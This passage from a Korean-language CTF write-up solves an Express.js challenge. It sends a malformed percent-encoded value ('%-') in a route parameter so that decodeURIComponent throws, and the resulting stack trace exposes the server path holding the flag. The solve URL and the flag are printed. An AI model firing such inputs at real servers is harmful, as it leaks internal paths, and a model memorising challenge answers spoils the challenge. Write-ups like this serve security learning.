+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>위 코드를 보면 값을 req.params를 이용해서 color의 값을 받아오는 것을 볼 수 있습니다.</strong><br></p>
+<p><img src="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true"><br><strong>req.params에 대해 조금 찾아보니 req.params를 이용해서 값을 받으면, 자동으로 <code>decodeUriComponent()</code> 메서드를 이용해서 값을 디코딩한다고 합니다.</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E0%A4%A&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URIError: malformed URI sequence</span></span><br></pre></td></tr></table></figure>
+<p><strong>MDN Web Docs에서 decodeURLComponent() 메서드를 확인해 보니 인자 값으로 위와 같은 값이 들어오면 에러를 내뱉는 다는 것을 알 수 있었습니다.</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%61&quot;</span>);</span><br><span class="line"><span class="string">&quot;a&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%62&quot;</span>);</span><br><span class="line"><span class="string">&quot;b&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%63&quot;</span>);</span><br><span class="line"><span class="string">&quot;c&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%AA&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br><span class="line">(anonymous) @ VM208:<span class="number">1</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%-&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><strong>그래서 왜 에러가 나는 지 확인을 해보니 ascii code 범위를 벗어나 매칭 되는 값이 없어서 에러가 나는 거 같았습니다. %AA ~ %FF 이 외에도 여러가지 값들을 다 넣어보니 모두 에러가 나는 것을 확인했습니다.</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;%-&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:148:15)</span><br><span class="line">    at matchLayer (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at expressInit (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure>
+<p><strong>그래서 color의 값으로 %-을 주니 에러가 났고, 예상대로 절대 경로 모두 출력됐고, 절대 경로 내에 flag가 있었습니다.</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5003&#x2F;truecolors&#x2F;%-</span><br></pre></td></tr></table></figure>
+<p><code>FLAG : CTF&#123;TurnsOutItsNotRegexFault&#125;</code></p>
+<hr>
+<h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><p>(Writing)</p>
+<hr>
+<h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><p>(Writing)</p>
+<hr>
+<h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><p>(Writing)</p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-1"><span class="toc-number">1.</span> <span class="toc-text">Challenge 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-2"><span class="toc-number">2.</span> <span class="toc-text">Challenge 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-3"><span class="toc-number">3.</span> <span class="toc-text">Challenge 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-4"><span class="toc-number">4.</span> <span class="toc-text">Challenge 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-5"><span class="toc-number">5.</span> <span class="toc-text">Challenge 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-6"><span class="toc-number">6.</span> <span class="toc-text">Challenge 6</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/24/2021-01-24-express-challenge/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&text=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&is_video=false&description=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Express Challenge Write Up (Gynvael Coldwind)&body=Check out this article: http://example.com/2021/01/24/2021-01-24-express-challenge/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&name=Express Challenge Write Up (Gynvael Coldwind)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/24/2021-01-24-express-challenge/&t=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
